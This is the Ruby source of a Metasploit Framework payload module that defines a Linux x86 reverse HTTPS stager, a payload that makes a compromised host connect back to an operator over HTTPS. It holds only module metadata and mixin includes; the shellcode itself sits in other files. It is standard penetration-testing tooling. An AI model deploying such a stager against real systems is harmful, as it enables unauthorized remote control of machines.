##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/reverse_https'
require 'msf/core/payload/linux/reverse_https'

module Metasploit4

  CachedSize = 347

  include Msf::Payload::Stager
  include Msf::Payload::Linux
  include Msf::Payload::Linux::ReverseHttps

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Linux x86 Reverse HTTPS Stager',
      'Description' => 'Tunnel communication over HTTPS',
      'Author'      => 'Jim Shaver',
      'License'     => MSF_LICENSE,
      'Platform'    => 'linux',
      'Arch'        => ARCH_X86,
      'Handler'     => Msf::Handler::ReverseHttps,
      'Convention'  => 'sockedi https'))
  end

end
